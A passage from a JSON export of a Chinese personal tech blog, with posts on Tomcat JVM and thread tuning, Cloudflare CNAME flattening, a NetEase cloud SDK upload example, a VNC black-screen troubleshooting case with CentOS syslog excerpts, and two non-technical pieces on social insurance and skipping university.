path=&quot;&quot; debug=&quot;0&quot; reloadable=&quot;true&quot;/&gt; 创建 data 目录 mkdir /data/然后新建一个 jsp 文件 &lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; %&gt; &lt;% out.print(&quot;test&quot;); %&gt; 访问 优化 java.lang.OutOfMemoryError: Java heap space异常表示堆内存空间满了，如果不是程序逻辑的bug，可能是因为项目中引用的jar比较多，导到内存溢出。JVM默认堆的最小使用内存为物理内存的1/64，最大使用内存为物理内存的1/4，如8G的物理内存，JVM默认堆的最小和最大内存分别为128m和2048m。通过调整JVM的-Xms（初始内存）和-Xmx（最大内存）两个参数加大内存使用限制。 java.lang.OutOfMemoryError: PermGen space异常表示静态内存区满了，通常是由于加载的类过多导致。jdk8以下版本通过修改JVM的-XX:PermSize和-XX:MaxPermSize两个参数，限制静态区最小和最大内存范围。jdk8改变了内存模型，将类定义存放到了元数据（MetaspaceSize）空间，而元数据空间是与堆空间共享同一块内存区域的，所以在JDK8以后版本不会存在PermGen space异常了，故不用设置此参数。 java.lang.StackOverflowError异常表示栈内存溢出。通常是由于死循环、无限递归导致。 修改Tomcat的内存配置，打开$TOMCAT_HOME/bin/catalina.sh文件（Windows系统是catalina.bat文件），大楖在250行左右，在JAVA_OPTS参数上添加内存参数设置即可。完整的JVM参数设置如下所示： JAVA_OPTS=&quot;$JAVA_OPTS -server -Xms2048m -Xmx2048m -XX:PermSize=128m -XX:MaxPermSize=256 -Djava.awt.headless=true&quot;-server参数：表示以服务模式启动，启动速度会稍微慢一点，但性能会高很多。不加这个参数，默认是以客户端模式启动。java.awt.headless=true参数：与图形操作有关，适用于linux系统。如生成验证码，含义是当前使用的是没有安装图安装图形界面的服务器，应用中如果获取系统显示有关参数会抛异常，可通过jmap -heap proccess_id查看设置是否成功。 修改后 并发配置优化主要配置Tomcat能处理的请求数，当一个进程的线程数超过500个的话，那么这个进程的运行效率就很低了。表面上看线程越多处理的请求越多，其实过多的线程会占用CPU在不同线程之间切换的资源，导致CPU在每个线程上处理的时间片极期有限，反而会降低服务器的响应性能。 &lt;Connector port=&quot;8080&quot; protocol=&quot;org.apache.coyote.http11.Http11AprProtocol&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; maxThreads=&quot;500&quot; minSpareThreads=&quot;100&quot; maxSpareThreads=&quot;200&quot; acceptCount=&quot;200&quot; maxIdleTime=&quot;30000&quot; enableLookups=&quot;false&quot; /&gt;Tomcat的并发请求处理数量=maxThreads + acceptCount maxThreads：最大能接受的请求数，默认为200minSpareThreads：最少备用线程数，默认初始化，默认为25maxSpareThreads：最多备用线程数，一旦创建的线程超过这个值，Tomcat就会关闭不再需要的socket线程acceptCount：等待处理的请求队列，默认为100，超过队列长度，服务器则拒绝客户端请求，直接返回403maxIdleTime：如果一个线程在30秒以内没有活跃，则终止运行并从线程池中移除。除非线程池数量小于或等于minSpareThreads数量。默认值是1分钟enableLookups：如果为true，调用request.getRemoteHost会执行DNS反查，反向解析IP对应的域名或主机，效率较低，建议设为false。 更多参数设置，请参考Tomcat官方文档：http://tomcat.apache.org/tomcat-8.0-doc/config/http.html","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://awen.me/tags/Java/"}]},{"title":"Cloudflare 的 CNAME Flattening","slug":"cloudflare-的CNAME-Flattening","date":"2018-04-02T08:08:12.000Z","updated":"2021-02-26T06:05:29.272Z","comments":true,"path":"posts/49056.html","link":"","permalink":"https://awen.me/posts/49056.html","excerpt":"今天推一波 Cloudflare 的 CNAME Flattening 功能，它能解决什么问题呢？我们先来看一个需求： 现在我有一个域名 awen.me 我希望用户访问 https://awen.me 就可以看到我的网页，同时我又想使用邮件服务（邮件服务需要添加 MX 记录），如果你直接添加 A 记录解析到你的网站是没有问题的， 也就是 A记录+MX记录；但是如果你希望使用 CNAME记录+MX记录，通常会在使用 CDN 的时候用到 CNAME 解析，则会冲突 大多数域名厂商是不允许你这么添加的，但是有的也允许你添加只不过会提示你，不过你的邮件服务可能无法正常收发邮件。这是因为 DNS 就是这样设计的。参考 RFC 1034 文档","text":"今天推一波 Cloudflare 的 CNAME Flattening 功能，它能解决什么问题呢？我们先来看一个需求： 现在我有一个域名 awen.me 我希望用户访问 https://awen.me 就可以看到我的网页，同时我又想使用邮件服务（邮件服务需要添加 MX 记录），如果你直接添加 A 记录解析到你的网站是没有问题的， 也就是 A记录+MX记录；但是如果你希望使用 CNAME记录+MX记录，通常会在使用 CDN 的时候用到 CNAME 解析，则会冲突 大多数域名厂商是不允许你这么添加的，但是有的也允许你添加只不过会提示你，不过你的邮件服务可能无法正常收发邮件。这是因为 DNS 就是这样设计的。参考 RFC 1034 文档 If a CNAME RR is present at a node, no other data should be present; this ensures that the data for a canonical name and its aliases cannot be different.意思是如果CNAME记录指向了一个域名节点，为了确保不会出现不同的解析结果，那么这个域名节点将不在接受其他的记录值了。 那么假如说你希望使用 CDN 服务的同时又使用邮件服务其实也不是不可以的： 第一种方法，就是使用类似 Cloudflare 这种 CDN 加速服务，使用 NS 解析，把域名 DNS 解析修改为 Cloudflare 这种 CDN 厂商的进行加速基本不需要做任何过多的配置，Cloudflare 免费版解析得到的是国外的地址很可能加速有效果还不如不加速。但是你如果不想备案又想用 CDN 也是可以的，当然你也可以付费 Cloudflare 和百度合作国内也有不少节点（需要付费+备案），但是Cloudflare 都是按功能收费的，你也可以尝试找找国内的类似服务。目前看我基本没有发现什么特别满意的，国内我还是比较喜欢又拍云的服务，只不过又拍不支持 NS 解析这种方式，又拍除了 CDN 加速之外还有各种附加功能，例如 HTTPS、webp 自适应、Let’s Encrypt 自动续签证书以及支持 Rewrite 规则等等非常好用的功能，这里有些功能在 Cloudflare 这种国外 CDN 大厂可都是要另外单独付费才可以使用的，就比如说自定义缓存规则这个，又拍云可以非常精细的控制不同文件类型、不同路径的文件缓存规则，而 Cloudflare 界面上我只看到了个全局环境配置。 第二种方法，是获取 CDN 厂商的边缘 IP 地址，将其添加为 A 记录，例如解析得到的 CDN 厂商 IP 为 1.1.1.1,则你可以添加 A 记录，因为上面说了 A 记录和 MX 记录是可以同时存在的: 记录名称 记录类型 记录值 @ A 1.1.1.1但是 CDN 的节点 IP 有很多，你如果希望达到 CDN 加速效果其实这样做非常麻烦，你要自己根据运营商线路做解析，并且 CDN 厂商的节点 IP 经常变更，不好维护。 那么上面说的 CNAME Flattening 功能就能解决这个问题，你只需要使用 Cloudflare 的 DNS 解析服务即可。在 Cloudflare 默认该功能是开启的 你只需要按 CDN 厂商的要求添加 CNAME 解析即可。例如我使用又拍云的 CDN 解析值为 生效后我查询解析 ➜ www dig awen.me ; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; awen.me ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 5204 ;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;awen.me. IN A ;; ANSWER SECTION: awen.me. 264 IN A 183.131.200.74 awen.me. 264 IN A 183.131.200.69 awen.me. 264 IN A 183.131.200.75 awen.me. 264 IN A 183.131.200.81 awen.me. 264 IN A 183.131.200.61 ;; Query time: 0 msec ;; SERVER: 127.0.0.1#53(127.0.0.1) ;; WHEN: Mon Apr 02 20:05:35 CST 2018 ;; MSG SIZE rcvd: 116得到的 IP 是 CDN 边缘节点的 IP 地址，可以看到这一个地区解析的 IP 地址就这么多，那么多节点你觉得你能管理好吗？ 同时我还做了邮件解析 ➜ www dig awen.me MX ; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; awen.me MX ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 60041 ;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;awen.me. IN MX ;; ANSWER SECTION: awen.me. 300 IN MX 20 mx2.zoho.com. awen.me. 300 IN MX 10 mx.zoho.com. ;; Query time: 383 msec ;; SERVER: 127.0.0.1#53(127.0.0.1) ;; WHEN: Mon Apr 02 16:29:07 CST 2018 ;; MSG SIZE rcvd: 83太棒了，鱼与熊掌同时可得。 之前我使用腾讯的 DNS 解析 发现居然可以同时添加 CNAME 和 MX 记录把我高兴的，因为在阿里云 DNSPOD 提交都直接提示冲突，我还以为腾讯解决了这个难题呢，没想到咨询后发现是他们的 BUG。","categories":[],"tags":[{"name":"dns","slug":"dns","permalink":"https://awen.me/tags/dns/"}]},{"title":"有社保和没社保的区别!有公积金和没公积金的区别","slug":"有社保和没社保的区别","date":"2018-04-01T03:18:38.000Z","updated":"2021-02-26T06:05:29.341Z","comments":true,"path":"posts/27175.html","link":"","permalink":"https://awen.me/posts/27175.html","excerpt":"在我刚毕业的时候找了份工作，入职时劳动合同也没签，就更别提什么社保了。老板美其名曰“你们现在工资太少（当时2000多），扣了社保你到手钱就少了”，似乎是为了我好才不缴。当时在合肥，合肥几乎很少有公司给员工缴纳社保，即使是哪些看着很正规的大厂给员工也是按社保最低缴纳。要知道 《劳动合同法》 规定入职之日起必须给员工签订劳动合同，按规定按工资总额缴纳社保和扣个税的。","text":"在我刚毕业的时候找了份工作，入职时劳动合同也没签，就更别提什么社保了。老板美其名曰“你们现在工资太少（当时2000多），扣了社保你到手钱就少了”，似乎是为了我好才不缴。当时在合肥，合肥几乎很少有公司给员工缴纳社保，即使是哪些看着很正规的大厂给员工也是按社保最低缴纳。要知道 《劳动合同法》 规定入职之日起必须给员工签订劳动合同，按规定按工资总额缴纳社保和扣个税的。 我记得12年我被诊断了个急性阑尾炎，去了趟医院花了好几千，这都是要自己掏现金支付的，医院的药那么贵，如果说有社保，公司按规定缴纳了医保，则可以省下不少钱。 不过话说回来，主要原因还是因为当时自己没本事，谁让当时脑子进水学了个不好找工作的文科专业，有本事也不会去这种公司干。 另外一个就是当地的环境就这样，别的单位都不缴也没啥事，监管部门根本不管事的。 14年到了杭州后，明显感觉杭州的环境好很多，当然主要原因也是自己努力提升自己的能力找的工作比以前好很多了，至少到目前为止我呆的公司都是缴纳五险一金的。有些公司还是按最低缴纳的了，全额缴纳的要么是大厂要么是真有钱的单位，创业公司其实本身也是没钱的，几乎都是按最低缴纳（能有啥办法，总比不缴强，现实就这样）。 在杭州一个小感冒，去趟医院都得花好几百，有医保根本就不需要自己掏一分钱，这对于刚入职场没几年，没什么钱的人来说真的是能省一笔是一笔吧！ 不过需要注意，医保不能断，断了会很麻烦。 在杭州几乎什么都和社保挂钩，比如说你要考驾照，必须要有居住证，而办居住证的前提条件就是必须在杭州工资缴纳社保满2年，并且不算补缴才能办，当然了，买房、落户、买车都是和社保挂钩的，没有社保你基本稍微大点的事情都办不了。 另外如果你周末没事想去景区溜达，比如西溪湿地、灵隐寺、岳庙、虎跑、杭州植物园这些收费景点有社保办个公园卡一年40块钱去这些地方是相当便宜的，比如杭州植物园正常门票 10 块钱一次，有了公园卡就不要钱了（少数景点需要补差价，比如西溪湿地原价80，有公园卡补差价10元就可以进去）。当然公园卡几乎杭州著名点的收费景点都不要钱，去的次数多是相当划算的。而且杭州的景色你懂的。 另外就是公积金，有的公司会缴纳公积金，数额不等，有的按5%缴有的按工资全额12%缴。这笔钱可以存着买房贷款（个人可贷额度=申请贷款时公积金账户月均余额×15倍，精确至千位，低于20万元的按20万元确定，高于50万元的按50万元确定；职工及其配偶均缴存住房公积金的，合计可贷额度不得超过100万元。）并且还可以用这比钱还房贷，比如你公积金每月3000，房贷每月还6000，你只需要个人掏3000就可以了。用公积金贷款利率比商业贷款低很多（现在杭州买房有的都必须要全额付款，杭州有钱人多拆迁户手里都是大把大把的现金买房都要排队，商业贷款都不给买，而且还要摇号买房）或者一年取一次，可以最多取12个月每月 1000块，每年最高可提取12000，现在都可以网上取非常方便。另外如果离职了是可以全额取出来的。","categories":[],"tags":[{"name":"生活","slug":"生活","permalink":"https://awen.me/tags/%E7%94%9F%E6%B4%BB/"}]},{"title":"为什么你可以不读大学","slug":"为什么你可以不读大学","date":"2018-03-31T00:37:48.000Z","updated":"2021-02-26T06:05:29.297Z","comments":true,"path":"posts/30917.html","link":"","permalink":"https://awen.me/posts/30917.html","excerpt":"1、 我一直相信，互联网教育是未来的方向。美国三个主要的在线教育网站—-Udacity，Coursera，可汗学院—-我都经常访问。","text":"1、 我一直相信，互联网教育是未来的方向。美国三个主要的在线教育网站—-Udacity，Coursera，可汗学院—-我都经常访问。 2016年四月，Udacity 进入中国，推出了中文版“优达学城”，一下子引起了我的兴趣。因为它干了一件没有先例的事情：颁发网络文凭。它办了一个网上的“硅谷大学”，自己发文凭，名称是“纳米学位”。 “纳米学位（Nanodegree）是优达学城此前与 Google、Facebook、亚马逊等互联网公司联合推出的学历认证项目。学员在线学习，所有项目考核合格之后即可获得纳米学位。” 现在总共有12种纳米学位，包括机器学习、无人驾驶车开发、VR 开发这样非常前沿的领域。 官网这样介绍： “我们没有严格意义上的录取流程，对报名者唯一的要求是学习该纳米学位项目所必须的先修知识和技能。纳米学位项目采取自主学习模式，你可以按照你喜欢的速度完成项目。” 该公司宣称，国内的许多互联网公司（比如滴滴出行、优酷土豆、京东、新浪）已经认可了纳米学位。 我忍不住想，会不会以后找工作，大家手里拿的不是大学文凭，而是网站颁发的文凭？如果雇主认可网络文凭，我们是否还需要大学文凭？ 下面是我的一些思考。 2、 当代的大学起源于欧洲修道院的模式。学生要经过多年的苦修，经过考核，才能毕业。如果想成为高级僧侣，就必须再多熬几年。另外，还有导师作为监督人，防止你学到歪门邪说。 这种模式的两大弊端，演变到今天，已经越来越严重了：一个是传授的知识老化，另一个是极其浪费学生的时间。 3、 什么知识才是有用的知识？ 农业社会，上一代人的知识可以一成不变地用在下一代。而在信息社会，前几年的知识，再过几年就不能用了。 举例来说，眼下就业前景最好的行业，我觉得有两个：区块链和VR。它们在五年前都是不存在的，那时就业最好的是苹果iOS系统的应用开发，可是再往前推五年，它也是不存在的。伴随着它们的是，很多旧工作岗位的消失，比如塞班、黑莓、Windows Phone的开发。 这种情况下，大学应该教什么，我们根本不知道。学生毕业后的行业，现在根本还没有出现。因此，大学只能重点教基础类课程，而且各个方向都必须教到，因为不知道学生将来会用到哪个方向的东西。这样就会耗费大量的时间，学习专业的各种基础知识，其中许多对人生来说是没用的。学生常常感叹，考试一结束，有些课程这辈子再没有用到的机会了。 更糟糕的是，学生的培养计划，都是一些二三十年前毕业、然后一直待在大学里、与社会生产实践脱节的人制定的。他们的知识和思维早已过时了。这样的人指定你应该学习的知识，很可能在你学的时候就已经过时了。 4、 退一步说，就算你在大学里能学到了真正的知识，那也不应该在那里待四年。如果只学最需要学习的东西，一年就够了。 四年时间足以让一个人在任何领域成为资深业者，甚至专家。可是我们的大学生呢，经过本科四年，不要说领域专家，甚至能力强的学生都寥寥无几。我们的大学制度用了四年时间，培养出了大量一无所长的、迷茫困惑的、市场滞销的年轻人。 18岁是人生最有热情和精力投入一项事业的时候，但是，大学将你一连四年关在教室和图书馆里，把考试和绩点伪装成你奋斗的目标，人为将你与真实世界隔离，引导你去关注那些对未来人生毫不重要的事情。经过这样四年的歧途，等你真正走上社会、要跟全世界竞争的时候，你的竞争力不是变强了，而是变弱了。换句话说，四年制大学很可能是削弱你，而不是让你变得更强。 2014年诺贝尔物理学奖得主中村修二，就曾经写过一篇长文，名字就叫《东亚教育浪费了太多的生命》。 世界著名程序员 Jamie Zawinski 曾经解释，为什么他只读了一个学期的大学就退学。 “进了大学以后，每天8点就要起床，开始训练记忆力。有一门课我早就会了，想申请免修。教务长说不行，你必须上，这是政策。见鬼，我为什么要自己付钱，来这种地方。我就退学了，从来没后悔过。” 我们时代的很多成功者—-乔布斯、比尔盖茨、扎克伯格等等—-都是退学生，这绝不是偶然的。不是他们在大学待不下去，而是他们发现，没必要在那个地方待四年。如果他们咬着牙忍受下去，熬到拿到文凭的那一天，苹果公司和微软公司可能都不会有了。 读大学，只是18岁时很多种选择中的一种，不是唯一的选择，更谈不上是最好的选择。校园是一个美丽的地方，但是如果一定要在里面待上四年，那还是算了吧。 5、 德国和瑞士的中学生毕业后，要选择走学术道路还是职业道路。只有不到30%的人，会去读大学，其余的人都接受职业培训，为职业生涯做准备。 我认为，这才是更合理的制度。毕竟大多数人不会从事学术研究，而要靠某种职业谋生。你要知道，大学课程是为学术生涯打基础的，不是为职业生涯设计的。所以，你确定要投入某个职业，合理的选择不是先上大学，然后再找工作，而是一开始就接受职业培训，然后一边工作，一边学习各种对职业生涯有帮助的课程。 理论上，一个人只要接受了中等教育，就可以进社会了。大学的本意是为那些走学术生涯的人开设的，后来慢慢变味了，以至于现在社会上居然有一种说法，”大学是素质教育“。不是这样的，任何时间地点，你都有机会提高素质。 另外，从经济角度看，如果你不想走学术道路，却去读大学，将不利于你的收入。目前，技术工人的薪水，正在不断上升。比他人多几年职业经验，你早早就可以拿到高级技工或工程师的薪水。如果你大学毕业，从零开始就业，你的收入会比同龄人落后几年。如果你还欠了学生贷款，处境就更糟糕了。 6、 注意，我不是说知识无用，而是说知识（尤其是非学术的知识）不一定要通过大学获得，通过互联网一样可以接受高等教育，而且更高效和便宜。 技术已经成为人类社会发展的主导性力量，学习和教育变得比以往更重要、更关键。但是很不幸，我们的学习和教育制度已经完全过时，传授的知识有用的少，没用的多；传授方法仍然依靠灌输和记忆，而不是启发和理解，极其低效，浪费学生的时间，打击学习热情，磨灭对知识的兴趣；对年轻人的成长，正面影响少，负面影响大，而且看不到改变的希望。 以前，人生的选择很少，你不得不去读大学，因为没有其他地方可以接受高等教育。社会还把很多机会与文凭挂钩，先有文凭，然后才能有就业、职称、住房等等。 但是，时代已经变了，文凭正变得越来越不重要。那些与文凭挂钩的东西，正在一项项脱钩。 互联网将教育的自主权，交到了每个人自己手里。上什么课程、什么时间上，都完全由你决定。你可以一边工作，一边利用夜晚和周末，学习网络课程。这样的话，不仅早早就会有收入，而且只学那些对自己最有用、最感兴趣的内容，学习的效率很高。如果发现对学术有兴趣，将来再回大学，攻读更高的学位，也是完全可以的。 等到22岁，别人刚刚开始找工作，还在为归还学贷发愁，你已经有了四年工作经验和一些积蓄，认清了自己的人生道路，开始向事业的高峰冲刺了。 7、 对于那些正在大学里面苦苦努力、不知道方向何在的年轻人，我有一点建议。 大学课程是为了那些不知道学什么的人设计的，千万不要因为自己找不到方向，而被这些课程”画地为牢“限制住。你要主动去接触和学习，那些自己感兴趣的东西。引用一个网友的话，”你要做的就是自主、跨界、终身学习“。 转《未来世界的幸存者》","categories":[],"tags":[]},{"title":"使用网易云 Java sdk 上传文件到某个目录","slug":"使用网易云-Java-sdk-上传文件到某个目录","date":"2018-03-29T12:19:01.000Z","updated":"2021-02-26T06:05:29.312Z","comments":true,"path":"posts/37867.html","link":"","permalink":"https://awen.me/posts/37867.html","excerpt":"创建一个 maven 工程在 pom.xml 中加入 &lt;dependency&gt; &lt;groupId&gt;com.netease.cloud&lt;/groupId&gt; &lt;artifactId&gt;nos-sdk-java-publiccloud&lt;/artifactId&gt; &lt;version&gt;0.0.2&lt;/version&gt; &lt;/dependency&gt;","text":"创建一个 maven 工程在 pom.xml 中加入 &lt;dependency&gt; &lt;groupId&gt;com.netease.cloud&lt;/groupId&gt; &lt;artifactId&gt;nos-sdk-java-publiccloud&lt;/artifactId&gt; &lt;version&gt;0.0.2&lt;/version&gt; &lt;/dependency&gt; 然后建一个 class，代码如下 package test.test; import java.io.File; import com.netease.cloud.ClientConfiguration; import com.netease.cloud.Protocol; import com.netease.cloud.auth.BasicCredentials; import com.netease.cloud.auth.Credentials; import com.netease.cloud.services.nos.NosClient; import com.netease.cloud.services.nos.transfer.TransferManager; public class NeteaseNosPutFile { public static void main(String[] args) { String accessKey = &quot;&quot;; //AK String secretKey = &quot;&quot;; //SK Credentials credentials = new BasicCredentials(accessKey, secretKey); ClientConfiguration conf = new ClientConfiguration(); // 设置 NosClient 使用的最大连接数 conf.setMaxConnections(200); // 设置 socket 超时时间 conf.setSocketTimeout(10000); // 设置失败请求重试次数 conf.setMaxErrorRetry(2); // 如果要用 https 协议，请加上下面语句 conf.setProtocol(Protocol.HTTPS); NosClient nosClient = new NosClient(credentials,conf); nosClient.setEndpoint(&quot;nos-eastchina1.126.net&quot;); TransferManager transferManager = new TransferManager(nosClient); //要上传文件的路径 String filePath = &quot;kafka.pptx&quot;; try { nosClient.putObject(&quot;netease01&quot;,&quot;a/b/c/d/e/fkafka.pptx&quot;, new File(filePath)); }catch (Exception e){ System.out.println(e.getMessage()); } } }主要是这段，加目录的时候在 object 前面加上对应的目录，注意不是绝对路径 nosClient.putObject(&quot;netease01&quot;,&quot;a/b/c/d/e/fkafka.pptx&quot;, new File(filePath));","categories":[],"tags":[]},{"title":"从一个 VNC 黑屏故障谈一谈怎么排查系统层面的问题","slug":"从一个-VNC-黑屏故障谈一谈怎么排查系统层面的问题","date":"2018-03-29T10:44:50.000Z","updated":"2021-02-26T06:05:29.300Z","comments":true,"path":"posts/30949.html","link":"","permalink":"https://awen.me/posts/30949.html","excerpt":"上周接到一个用户返回他的云主机操作系统为 centos 7.x，重启后要等很久才可以 SSH 远程连接，通过控制台的 VNC 连接后显示的是整个界面黑屏，屏幕没有输出任何有价值的信息，就是一直黑的","text":"上周接到一个用户返回他的云主机操作系统为 centos 7.x，重启后要等很久才可以 SSH 远程连接，通过控制台的 VNC 连接后显示的是整个界面黑屏，屏幕没有输出任何有价值的信息，就是一直黑的 针对这个问题总结一下怎么去排查这个问题。 问题由于这个是客户的机器，我们是没有权限直接进入系统操作的，因此只能让用户提供 log 信息。通过对/var/log/messages 的日志分析发现 tomcat 停止花了5分钟左右的时间 此外检查了 Tomcat 的 log 发现大量的内存溢出情况 莫名奇妙的好了后来找用户要了权限对机器进行操作，在/etc/default/grub中去掉了console=ttyS0,115200和rhgb quiet，重新使用“grub2-mkconfig -o /boot/grub2/grub.cfg”重新产生grub，结果修改后，关机慢的现象不会出现了，而且重启恢复了之前的/etc/default/grub，还是无法复现； 奇怪的 rsyslogd日志另外从用户提供的时间点来看 rsyslogd 服务 在发起 signal 15 信号后也是等了5分钟才启动 这个时间点分别是: 停止15:37:09启动15:42:23 不过那会查看 Tomcat 的日志可以看出来在15:31就一直包内存溢出到15:31:49 左右停止，15:42:31 启动，又似乎和 Tomcat 没多大关系 我们看下正常的 rsyslogd 的启动和停止，基本几秒就启动了。 Mar 19 18:14:06 live-linux-kc-403 systemd: Stopping ACPI Event Daemon... Mar 19 18:14:06 live-linux-kc-403 systemd: Stopping Avahi mDNS/DNS-SD Stack... Mar 19 18:14:06 live-linux-kc-403 rsyslogd: [origin software=&quot;rsyslogd&quot; swVersion=&quot;7.4.7&quot; x-pid=&quot;990&quot; x-info=&quot;http://www.rsyslog.com&quot;] exiting on signal 15. Mar 19 18:14:20 live-linux-kc-403 rsyslogd: [origin software=&quot;rsyslogd&quot; swVersion=&quot;7.4.7&quot; x-pid=&quot;1010&quot; x-info=&quot;http://www.rsyslog.com&quot;] start Mar 19 18:14:20 live-linux-kc-403 rsyslogd-2307: warning: ~ action is deprecated, consider using the &apos;stop&apos; statement instead [try http://www.rsyslog.com/e/2307 ] Mar 19 18:14:18 live-linux-kc-403 kernel: Initializing cgroup subsys cpuset Mar 19 18:14:18 live-linux-kc-403 kernel: Initializing cgroup subsys cpu Mar 19 18:14:18 live-linux-kc-403 kernel: Initializing cgroup subsys cpuacct Mar 19 18:14:18 live-linux-kc-403 kernel: Linux version 3.10.0-123.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.2 20140120 (Red Hat 4.8.2-16) (GCC) ) #1 SMP Mon Jun 30 12:09:22 UTC 2014 Mar 19 18:14:18 live-linux-kc-403 kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-3.10.0-123.el7.x86_64 root=UUID=59f4da26-a8a2-4950-8101-6c5b9a4688ad ro crashkernel=auto vconsole.font=latarcyrheb-sun16 console=tty0 vconsole.keymap=us console=ttyS0,115200 net.ifnames=0 biosdevname=0 rhgb quiet另外还有一种情况是，这种看样子是非正常关机，等了2小时才开机 Mar 23 13:54:50 live-linux-kc-403 qemu-ga: info: guest-file-open, handle: 59012 Mar 23 13:54:50 live-linux-kc-403 qemu-ga: info: guest-file-close called, handle: 59012 Mar 23 13:54:50 live-linux-kc-403 qemu-ga: info: guest-file-open called, filepath: /proc/stat, mode: r Mar 23 13:54:50 live-linux-kc-403 qemu-ga: info: guest-file-open, handle: 59013 Mar 23 13:54:50 live-linux-kc-403 qemu-ga: info: guest-file-close called, handle: 59013 Mar 23 13:54:52 live-linux-kc-403 qemu-ga: info: guest-ping called Mar 23 13:55:06 live-linux-kc-403 qemu-ga: info: guest-ping called Mar 23 13:55:07 live-linux-kc-403 rsyslogd: [origin software=&quot;rsyslogd&quot; swVersion=&quot;7.4.7&quot; x-pid=&quot;989&quot; x-info=&quot;http://www.rsyslog.com&quot;] exiting on signal 15. Mar 23 15:23:04 live-linux-kc-403 rsyslogd: [origin software=&quot;rsyslogd&quot; swVersion=&quot;7.4.7&quot; x-pid=&quot;994&quot; x-info=&quot;http://www.rsyslog.com&quot;] start Mar 23 15:23:04 live-linux-kc-403 rsyslogd-2307: warning: ~ action is deprecated, consider using the &apos;stop&apos; statement instead [try http://www.rsyslog.com/e/2307 ] Mar 23 15:23:02 live-linux-kc-403 kernel: Initializing cgroup subsys cpuset Mar 23 15:23:02 live-linux-kc-403 kernel: Initializing cgroup subsys cpu Mar 23 15:23:02 live-linux-kc-403 kernel: Initializing cgroup subsys cpuacct Mar 23 15:23:02 live-linux-kc-403 kernel: Linux version 3.10.0-123.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.2 20140120 (Red Hat 4.8.2-16) (GCC) ) #1 SMP Mon Jun 30 12:09:22 UTC 2014 Mar 23 15:23:02 live-linux-kc-403 kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-3.10.0-123.el7.x86_64 root=UUID=59f4da26-a8a2-4950-8101-6c5b9a4688ad ro crashkernel=auto vconsole.font=latarcyrheb-sun16 console=tty0 vconsole.keymap=us console=ttyS0,115200 net.ifnames=0 biosdevname=0 rhgb quiet Mar 23 15:23:02 live-linux-kc-403 kernel: e820: BIOS-provided physical RAM map: Mar 23 15:23:02 live-linux-kc-403 kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable Mar 23 15:23:02 live-linux-kc-403 kernel: BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved Mar 23 15:23:02 live-linux-kc-403 kernel: BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved Mar 23 15:23:02 live-linux-kc-403 kernel: BIOS-e820: [mem 0x0000000000100000-0x00000000bffdefff] usable非正常的情况还有 Mar 23 17:02:42 live-linux-kc-403 systemd: Started Session 2 of user root. Mar 23 17:02:42 live-linux-kc-403 systemd-logind: New session 2 of user root. Mar 23 17:02:42 live-linux-kc-403 systemd: Starting Session 2 of user root. Mar 23 17:02:43 live-linux-kc-403 qemu-ga: info: guest-ping called Mar 23 17:02:45 live-linux-kc-403 systemd: Stopped Dump dmesg to /var/log/dmesg. Mar 23 17:02:45 live-linux-kc-403 systemd: Stopping Dump dmesg to /var/log/dmesg... Mar 23 17:02:45 live-linux-kc-403 systemd: Stopped target Timers. Mar 23 17:02:45 live-linux-kc-403 systemd: Stopping Timers. Mar 23 17:02:45 live-linux-kc-403 systemd: Stopping Session 2 of user root. Mar 23 17:02:45 live-linux-kc-403 rsyslogd: [origin software=&quot;rsyslogd&quot; swVersion=&quot;7.4.7&quot; x-pid=&quot;1004&quot; x-info=&quot;http://www.rsyslog.com&quot;] exiting on signal 15. Mar 23 17:07:59 live-linux-kc-403 rsyslogd: [origin software=&quot;rsyslogd&quot; swVersion=&quot;7.4.7&quot; x-pid=&quot;989&quot; x-info=&quot;http://www.rsyslog.com&quot;] start Mar 23 17:07:59 live-linux-kc-403 rsyslogd-2307: warning: ~ action is deprecated, consider using the &apos;stop&apos; statement instead [try http://www.rsyslog.com/e/2307 ] Mar 23 17:07:57 live-linux-kc-403 kernel: Initializing cgroup subsys cpuset Mar 23 17:07:57 live-linux-kc-403 kernel: Initializing cgroup subsys cpu Mar 23 17:07:57 live-linux-kc-403 kernel: Initializing cgroup subsys cpuacct Mar 23 17:07:57 live-linux-kc-403 kernel: Linux version 3.10.0-123.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.2 20140120 (Red Hat 4.8.2-16) (GCC) ) #1 SMP Mon Jun 30 12:09:22 UTC 2014 Mar 23 17:07:57 live-linux-kc-403 kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-3.10.0-123.el7.x86_64 root=UUID=59f4da26-a8a2-4950-8101-6c5b9a4688ad ro crashkernel=auto vconsole.font=latarcyrheb-sun16 console=tty0 vconsole.keymap=us console=ttyS0,115200 net.ifnames=0 biosdevname=0 rhgb quiet Mar 23 17:07:57 live-linux-kc-403 kernel: e820: BIOS-provided physical RAM map: Mar 23 17:07:57 live-linux-kc-403 kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable Mar 23 17:07:57 live-linux-kc-403 kernel: BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved Mar 23 17:07:57 live-linux-kc-403 kernel: BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved Mar 23 17:07:57 live-linux-kc-403 kernel: BIOS-e820: [mem 0x0000000000100000-0x00000000bffdefff] usable Mar 23 